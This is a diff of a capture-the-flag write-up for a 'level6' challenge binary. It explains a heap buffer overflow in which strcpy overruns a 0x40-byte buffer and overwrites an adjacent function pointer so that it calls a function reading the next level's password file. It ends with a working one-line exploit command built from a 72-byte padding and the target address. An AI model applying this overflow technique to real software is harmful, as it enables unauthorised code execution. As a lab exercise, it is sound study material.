@@ -1,48 +1,13 @@
 
-
-/********************************/ 
-/*	Ghidra decompiler       */
-/********************************/ 
-
-main:
-  char *__dest;
-  undefined4 *puVar1;
-  
-  __dest = (char *)malloc(0x40);
-  puVar1 = (undefined4 *)malloc(4);
-  *puVar1 = m;
-  strcpy(__dest,*(char **)(param_2 + 4));
-  (*(code *)*puVar1)();
-  return;
-
-m:
-  puts("Nope");
-  return;
-
-n:
-  system("/bin/cat /home/user/level7/.pass");
-  return;
-
-/********************************/ 
-/*	      Infos		*/
-/********************************/ 
-
 Vulnerability with srctpy in size fixed buffer (0x40)
 
-=> 73 char before segfault
+=> 2 buffers adjacent in the heap 
+=> We can overwrite the address of m() in the heap to the address of n()
+=> The offset is 72 bytes + adrress
+=> We can read the flag 
 
-
-
-Strategy:
--> overwrite m() called in *(*putvar) function to n() function, is it possible in an buffer overflow ? 
--> overwrite eip and return to n() function
-
-!!!!! PAR PURE CHANCE => etre certain que l'eip est bien stocke et ecrase dans la heap par l'overflow !!!!
-
-overflow -> try different padding 
 -> 72 bytes + 4 bytes for addrress of m()
 
-08048454 g     F .text	00000014              n
+address of n(): 0x08048454 
 
 ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
-
